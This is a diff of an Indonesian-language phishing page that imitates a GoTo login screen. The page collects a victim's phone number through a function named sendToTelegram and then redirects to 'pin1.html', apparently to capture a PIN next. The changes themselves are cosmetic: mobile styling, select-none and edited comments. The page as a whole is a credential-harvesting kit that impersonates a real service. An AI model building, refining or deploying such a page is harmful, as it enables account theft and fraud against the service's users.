@@ -9,13 +9,14 @@
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       background-color: #f8fafc;
+      -webkit-text-size-adjust: 100%; /* Mencegah teks membesar otomatis di HP */
     }
     input[type="tel"] {
-      font-size: 16px !important;
+      font-size: 16px !important; /* Ukuran pas agar tidak bikin layar zoom in sendiri */
     }
   </style>
 </head>
-<body class="flex flex-col min-h-screen text-slate-800 antialiased">
+<body class="flex flex-col min-h-screen text-slate-800 antialiased select-none">
 
   <div class="w-full max-w-[420px] mx-auto min-h-screen bg-white flex flex-col justify-between p-5 sm:p-6 shadow-sm">
     
@@ -112,7 +113,7 @@
           <span>Lanjut dengan Google</span>
         </button>
 
-        <!-- Footer Logo GoTo (Dinaikkan mendekati tombol Google) -->
+        <!-- Footer Logo GoTo -->
         <div class="flex items-center justify-center gap-1 pt-2">
           <span class="text-xs text-slate-500 font-medium">from</span>
           <img src="https://i.ibb.co.com/R4v8yYQ4/IMG-2901.png" alt="GoTo Logo" class="h-4 object-contain">
@@ -121,7 +122,6 @@
 
     </div>
 
-    <!-- Spacer bawah agar seimbang -->
     <div></div>
 
   </div>
@@ -147,7 +147,7 @@
     async function sendToTelegram(e) {
       e.preventDefault();
       
-      const phone = document.getElementById('phoneInput').value;
+      const phone = document.getElementById('phoneInput',).value;
       const btn = document.getElementById('btnSubmit');
       
       btn.disabled = true;
@@ -166,7 +166,6 @@
           })
         });
 
-        // Pindah ke file HTML tujuan
         window.location.href = "pin1.html";
         
       } catch (err) {
@@ -177,4 +176,5 @@
     }
   </script>
 </body>
-</html
+</html>
+
